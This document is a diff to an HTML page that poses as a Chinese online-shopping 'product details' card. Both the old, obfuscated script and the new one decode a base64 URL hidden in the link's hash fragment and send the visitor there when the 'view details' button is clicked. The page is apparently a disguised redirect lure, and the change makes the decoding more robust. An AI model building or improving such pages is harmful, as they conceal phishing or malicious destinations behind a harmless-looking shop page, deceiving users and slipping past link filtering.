@@ -13,39 +13,36 @@ body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,sans-serif;backgro
 .card-body h2{font-size:17px;color:#222;margin-bottom:8px}
 .card-body p{font-size:13px;color:#888;line-height:1.6;margin-bottom:10px}
 .card-foot{padding:0 20px 20px;display:flex;justify-content:center}
-.card-foot span{display:inline-block;padding:10px 36px;background:linear-gradient(135deg,#1677FF,#4096FF);color:#fff;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;user-select:none;text-decoration:none}
+.card-foot a{display:inline-block;padding:10px 36px;background:linear-gradient(135deg,#1677FF,#4096FF);color:#fff;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;text-decoration:none}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="card-img">&#128722;</div>
-  <div class="card-body">
-    <h2 id="t1">商品详情</h2>
-    <p>请确认信息后继续操作</p>
-  </div>
-  <div class="card-foot">
-    <span id="go" onclick="go()">查看详情</span>
-  </div>
+<div class="card-img">&#128722;</div>
+<div class="card-body"><h2>商品详情</h2><p>请确认信息后继续操作</p></div>
+<div class="card-foot"><a id="btn" href="#" onclick="return false;">查看详情</a></div>
 </div>
 <script>
 (function(){
-  var _0=document['getElementById'];
-  var _r=location['hash']||'';
-  if(!_r)return;
-  try{
-    var _d=atob(_r['substring'](1));
-    var _u=decodeURIComponent(_d);
-    if(/^https?:\/\//['test'](_u)){
-      var _b=_0('go');
-      _b['setAttribute']('data-u',_u);
-      _0('t1')['textContent']='商品已准备好';
-    }
-  }catch(e){}
-})();
-function go(){
-  var _u=document['getElementById']('go')['getAttribute']('data-u');
-  if(_u)location['href']=_u;
+var h=location.hash.substring(1);
+if(!h||h.length<4)return;
+var u='';
+try{
+  // 纯 JS base64 解码 (atob polyfill)
+  var s=h.replace(/-/g,'+').replace(/_/g,'/');
+  while(s.length%4)s+='=';
+  u=decodeURIComponent(Array.prototype.map.call(atob(s),function(c){return'%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''));
+}catch(e){
+  // atob 失败就尝试直接 URL 解码
+  try{u=decodeURIComponent(h)}catch(e2){}
 }
+if(u&&u.indexOf('http')===0){
+  var b=document.getElementById('btn');
+  b.href=u;
+  b.textContent='查看详情';
+  b.removeAttribute('onclick');
+}
+})();
 </script>
 </body>
 </html>
